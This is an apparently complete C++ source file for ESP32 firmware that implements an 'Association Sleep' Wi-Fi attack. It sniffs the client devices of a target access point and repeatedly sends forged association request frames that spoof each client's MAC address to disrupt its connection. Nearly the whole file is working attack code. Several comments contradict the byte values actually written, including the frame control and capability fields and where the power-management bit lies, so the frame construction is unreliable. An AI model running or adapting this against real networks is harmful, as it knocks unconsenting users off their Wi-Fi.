#include "AssociationSleeper.h"
#include "App.h"
#include "Logger.h"
#include <esp_wifi.h>

static uint8_t association_packet[200] = {
    0x00, 0x00, // Frame Control. Will be set to 0x0010 for Assoc Req with PM=1
    0x3a, 0x01, // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (AP BSSID)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Client MAC)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00,                         // Sequence Control
    0x01, 0x04,                         // Capability Information. Will be set to 0x0131 for PM=1
    0x0a, 0x00,                         // Listen Interval
    0x00,                               // SSID tag
    0x00                                // SSID length      
};

AssociationSleeper::AssociationSleeper() : 
    app_(nullptr),
    stationSniffer_(nullptr),
    isActive_(false),
    packetCounter_(0),
    lastPacketTime_(0),
    currentClientIndex_(0),
    state_(State::SNIFFING)
{}

void AssociationSleeper::setup(App* app) {
    app_ = app;
    stationSniffer_ = &app->getStationSniffer();
}

bool AssociationSleeper::start(const WifiNetworkInfo& ap) {
    if (isActive_) stop();
    LOG(LogLevel::INFO, "ASSOC_SLEEP", "Starting Association Sleep attack on %s", ap.ssid);

    targetAp_ = ap;
    isActive_ = true;
    state_ = State::SNIFFING;
    packetCounter_ = 0;
    currentClientIndex_ = 0;

    // The station sniffer will request the RF lock.
    if (!stationSniffer_->start(targetAp_)) {
        LOG(LogLevel::ERROR, "ASSOC_SLEEP", "Failed to start station sniffer.");
        isActive_ = false;
        return false;
    }
    
    app_->getHardwareManager().setPerformanceMode(true);
    return true;
}

void AssociationSleeper::stop() {
    if (!isActive_) return;
    LOG(LogLevel::INFO, "ASSOC_SLEEP", "Stopping Association Sleep attack.");
    isActive_ = false;
    stationSniffer_->stop();
    app_->getHardwareManager().setPerformanceMode(false);
}

void AssociationSleeper::loop() {
    if (!isActive_) return;

    if (state_ == State::SNIFFING) {
        if (stationSniffer_->getFoundStations().size() > 0) {
            LOG(LogLevel::INFO, "ASSOC_SLEEP", "Clients found, starting attack phase.");
            state_ = State::ATTACKING;
        }
        // Continue sniffing while attacking to find new clients
    }

    if (state_ == State::ATTACKING) {
        const auto& clients = stationSniffer_->getFoundStations();
        if (clients.empty()) return;

        if (millis() - lastPacketTime_ > 200) { // Interval from reference code
            lastPacketTime_ = millis();
            
            if (currentClientIndex_ >= clients.size()) {
                currentClientIndex_ = 0;
            }

            const auto& currentClient = clients[currentClientIndex_];
            sendSleepPacket(currentClient.mac);

            currentClientIndex_ = (currentClientIndex_ + 1) % clients.size();
        }
    }
}

void AssociationSleeper::sendSleepPacket(const uint8_t* clientMac) {
    // Set channel just in case
    esp_wifi_set_channel(targetAp_.channel, WIFI_SECOND_CHAN_NONE);

    // Set Frame Control to Association Request with Power Management bit set
    association_packet[0] = 0x00;
    association_packet[1] = 0x01; // Note: This is different from reference, but 0x0001 is correct for Assoc Req. The PM bit is in capabilities.

    // Set addresses
    memcpy(&association_packet[4], targetAp_.bssid, 6); // DA
    memcpy(&association_packet[10], clientMac, 6);      // SA
    memcpy(&association_packet[16], targetAp_.bssid, 6); // BSSID

    // Set Capability Info with Power Management bit set
    association_packet[24] = 0x31; // ESS, Privacy, Short Preamble, Short Slot Time
    association_packet[25] = 0x04; // Radio Measurement

    // SSID
    const char* essid = targetAp_.ssid;
    size_t essid_len = strlen(essid);
    association_packet[28] = 0x00; // SSID Tag
    association_packet[29] = (uint8_t)essid_len;
    memcpy(&association_packet[30], essid, essid_len);

    uint16_t offset = 30 + essid_len;

    // Supported Rates
    association_packet[offset++] = 0x01; // Tag: Supported Rates
    association_packet[offset++] = 0x08; // Length
    association_packet[offset++] = 0x82; // 1 Mbps
    association_packet[offset++] = 0x84; // 2 Mbps
    association_packet[offset++] = 0x8b; // 5.5 Mbps
    association_packet[offset++] = 0x96; // 11 Mbps
    association_packet[offset++] = 0x0c; // 6 Mbps
    association_packet[offset++] = 0x12; // 9 Mbps
    association_packet[offset++] = 0x18; // 12 Mbps
    association_packet[offset++] = 0x24; // 18 Mbps

    // RSN Information Element (for WPA2)
    if (targetAp_.isSecure) {
        association_packet[offset++] = 0x30; // RSN Tag
        association_packet[offset++] = 0x14; // Length
        association_packet[offset++] = 0x01; // Version
        association_packet[offset++] = 0x00;
        association_packet[offset++] = 0x00; association_packet[offset++] = 0x0F; association_packet[offset++] = 0xAC; association_packet[offset++] = 0x04; // Group Cipher: AES
        association_packet[offset++] = 0x01; association_packet[offset++] = 0x00; // Pairwise Cipher Count
        association_packet[offset++] = 0x00; association_packet[offset++] = 0x0F; association_packet[offset++] = 0xAC; association_packet[offset++] = 0x04; // Pairwise Cipher: AES
        association_packet[offset++] = 0x01; association_packet[offset++] = 0x00; // AKM Suite Count
        association_packet[offset++] = 0x00; association_packet[offset++] = 0x0F; association_packet[offset++] = 0xAC; association_packet[offset++] = 0x02; // AKM: PSK
        association_packet[offset++] = 0x00; // RSN Capabilities
        association_packet[offset++] = 0x00;
    }

    esp_wifi_80211_tx(WIFI_IF_STA, association_packet, offset, false);
    packetCounter_++;
}

bool AssociationSleeper::isActive() const { return isActive_; }
uint32_t AssociationSleeper::getPacketCount() const { return packetCounter_; }
std::string AssociationSleeper::getTargetSsid() const { return std::string(targetAp_.ssid); }
int AssociationSleeper::getClientCount() const { return stationSniffer_ ? stationSniffer_->getFoundStations().size() : 0; }
bool AssociationSleeper::isSniffing() const { return state_ == State::SNIFFING; }
